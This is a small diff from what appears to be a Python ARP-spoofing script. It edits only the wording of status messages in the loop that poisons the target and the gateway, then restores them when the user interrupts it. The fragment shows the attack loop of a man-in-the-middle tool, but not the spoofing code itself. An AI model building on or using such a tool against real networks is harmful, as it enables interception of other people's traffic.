@@ -46,10 +46,10 @@ try:
 		spoofing(target_ip, gateway_ip) 
 		spoofing(gateway_ip, target_ip) 
 		sender_packet = sender_packet + 2
-		print("\r[+] Packet Sends = " + str(sender_packet), end="") 
+		print("\r[+] Packet Have Been Sent = " + str(sender_packet), end="") 
 		time.sleep(2)
 except KeyboardInterrupt:
-	print("\n[-] This Attack Was Successfully Stoped!... Please White To Restore The Normal")
+	print("\n[-] This Attack Was Successfully Stopped!--- Please Wait To The Network Return To The Normal Mode...")
 	time.sleep(4)
 	restore(target_ip, gateway_ip)
 	restore(gateway_ip, target_ip)
